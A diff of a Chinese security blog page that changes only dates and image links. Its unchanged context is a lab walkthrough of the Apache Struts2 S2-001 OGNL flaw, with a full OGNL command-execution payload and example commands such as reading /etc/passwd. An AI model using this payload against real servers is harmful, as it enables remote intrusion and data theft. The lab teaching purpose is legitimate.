@@ -641,7 +641,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-03-13
+                    2022-04-16
                 </div>
                 
 
@@ -677,25 +677,25 @@
             <div id="articleContent">
                 <h1 id="Apache-Struts2-远程代码执行漏洞"><a href="#Apache-Struts2-远程代码执行漏洞" class="headerlink" title="Apache Struts2 远程代码执行漏洞"></a>Apache Struts2 远程代码执行漏洞</h1><h2 id="Xx-漏洞介绍"><a href="#Xx-漏洞介绍" class="headerlink" title="Xx 漏洞介绍"></a>Xx 漏洞介绍</h2><p>Apache Struts2有很多漏洞，该漏洞因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %{value} 进行解析，然后重新填充到对应的表单数据中。例如注册或登录页面，提交失败后端一般会默认返回之前提交的数据，由于后端使用 %{value} 对提交的数据执行了一次 OGNL 表达式解析，所以可以直接构造 Payload 进行命令执行。</p>
 <h2 id="Ax-搭建漏洞环境"><a href="#Ax-搭建漏洞环境" class="headerlink" title="Ax 搭建漏洞环境"></a>Ax 搭建漏洞环境</h2><p>使用docker-compose快速搭建环境。</p>
-<p><img src="https://gitee.com/enomothem/myblogphoto/raw/master/img/20210218215821.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/enomothem/squarebackets/zixinghe/20210218215821.png"></p>
 <p>在虚拟机里启动后，就可以访问该IP:8080</p>
-<p><img src="https://gitee.com/enomothem/myblogphoto/raw/master/img/20210218220134.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/enomothem/squarebackets/zixinghe/20210218220134.png"></p>
 <h2 id="Bx-验证"><a href="#Bx-验证" class="headerlink" title="Bx 验证"></a>Bx 验证</h2><p>在账号或密码处输入%{1+1}，得结果2，这样就验证了此处有S2-001漏洞。</p>
-<p><img src="https://gitee.com/enomothem/myblogphoto/raw/master/img/20210218222357.gif"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/enomothem/squarebackets/zixinghe/20210218222357.gif"></p>
 <h2 id="Cx-利用"><a href="#Cx-利用" class="headerlink" title="Cx 利用"></a>Cx 利用</h2><p>构建payload，实现任意远程代码执行。</p>
 <pre class=" language-txt"><code class="language-txt">%{ #a=(new java.lang.ProcessBuilder(new java.lang.String[]{“CMD”,”CMD”})).redirectErrorStream(true).start(), #b=#a.getInputStream(), #c=new java.io.InputStreamReader(#b), #d=new java.io.BufferedReader(#c), #e=new char[50000], #d.read(#e), #f=#context.get(“com.opensymphony.xwork2.dispatcher.HttpServletResponse”), #f.getWriter().println(new java.lang.String(#e)), #f.getWriter().flush(),#f.getWriter().close() }
 </code></pre>
 <p>在 <code>new java.lang.String[]{"CMD","CMD"}</code>处，可替换需要执行的命令</p>
 <p>例如，执行ls命令，第二个参数查看根目录下的文件（/）</p>
-<p><img src="https://gitee.com/enomothem/myblogphoto/raw/master/img/20210218223456.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/enomothem/squarebackets/zixinghe/20210218223456.png"></p>
 <p>查看用户密码</p>
 <p><code>cat /etc/passwd</code></p>
-<p><img src="https://gitee.com/enomothem/myblogphoto/raw/master/img/20210218223701.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/enomothem/squarebackets/zixinghe/20210218223701.png"></p>
 <p>查看你所需要的一切</p>
 <p><code>uname -a</code> 查看内核版本</p>
-<p><img src="https://gitee.com/enomothem/myblogphoto/raw/master/img/20210218224202.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/enomothem/squarebackets/zixinghe/20210218224202.png"></p>
 <p><code>cat /proc/meminfo </code>内存详细信息</p>
-<p><img src="https://gitee.com/enomothem/myblogphoto/raw/master/img/20210218224654.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/enomothem/squarebackets/zixinghe/20210218224654.png"></p>
 <p>这里就随意发挥，需要Linux的熟悉程度，就可以得到你需要的任何信息。</p>
 <h2 id="Dx-声明"><a href="#Dx-声明" class="headerlink" title="Dx 声明"></a>Dx 声明</h2><ul>
 <li>请遵守，爱护《中华人民共和国网络安全法》</li>
@@ -1331,7 +1331,7 @@
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">220.9k</span>&nbsp;字
+                class="white-color">221k</span>&nbsp;字
             
             
             
